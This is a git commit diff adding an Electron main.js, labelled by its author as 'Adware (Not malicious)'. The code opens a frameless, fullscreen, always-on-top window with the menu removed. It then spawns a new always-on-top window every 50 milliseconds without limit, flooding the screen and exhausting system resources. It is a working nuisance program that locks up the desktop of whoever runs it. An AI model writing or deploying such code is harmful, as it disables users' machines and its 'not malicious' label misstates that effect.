6bb9b1b488a9ef7f76ceee972feda01b683e03b3
Davi Alves <davialves.xy@gmail.com>
2025-03-12 11:37:31 -0300

    Adware (Not malicious)

---
+++ main.js
@@ -0,0 +1,59 @@
+const { app, BrowserWindow, Menu, ipcMain, screen } = require("electron");
+
+let mainWindow;
+
+app.whenReady().then(() => {
+  mainWindow = new BrowserWindow({
+    width: 1000,
+    height: 1000,
+    x: 0,
+    y: 0,
+    resizable: true,
+    fullscreen: true,
+    fullscreenable: true,
+    frame: false,
+    alwaysOnTop: true,
+    webPreferences: {
+      nodeIntegration: true,
+    },
+  });
+
+  Menu.setApplicationMenu(null);
+  mainWindow.loadFile("index.html");
+});
+
+// Função para criar uma nova janela
+function criarNovaJanela(x, y) {
+  const novaJanela = new BrowserWindow({
+    x: x,
+    y: y,
+    width: 200,
+    height: 200,
+    resizable: false,
+    frame: false,
+    alwaysOnTop: true,
+    webPreferences: {
+      nodeIntegration: true,
+    },
+  });
+
+  novaJanela.loadFile("index.html"); // Carrega o mesmo arquivo HTML ou outro, se preferir
+}
+
+app.on("window-all-closed", () => {
+  app.quit();
+});
+
+let x = 0;
+let y = 0;
+
+setInterval(() => {
+  const { width, height } = screen.getPrimaryDisplay().workAreaSize;
+  if (x >= width) {
+    x = 0;
+    y += 200;
+  } else {
+    x += 200;
+  }
+  criarNovaJanela(x, y);
+}, 50);
